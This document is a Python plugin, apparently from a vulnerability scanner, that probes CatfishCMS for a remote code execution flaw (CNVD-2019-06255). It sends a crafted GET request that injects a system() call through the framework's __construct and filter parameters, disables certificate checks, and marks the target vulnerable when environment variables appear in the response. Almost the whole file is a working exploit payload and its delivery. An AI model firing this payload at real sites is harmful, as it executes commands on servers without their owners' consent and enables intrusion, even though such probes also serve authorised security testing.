#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',
      'huixian'   :  '',
      'method'    :   'get',
      'bugname'   :   'CatfishCMS RCE CNVD-2019-06255',
      'level'     :   'critical',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/s=set&_method=__construct&method=*&filter[]=system'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "OS" in res.text and "PATH" in res.text and "SHELL" in res.text and "USER" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret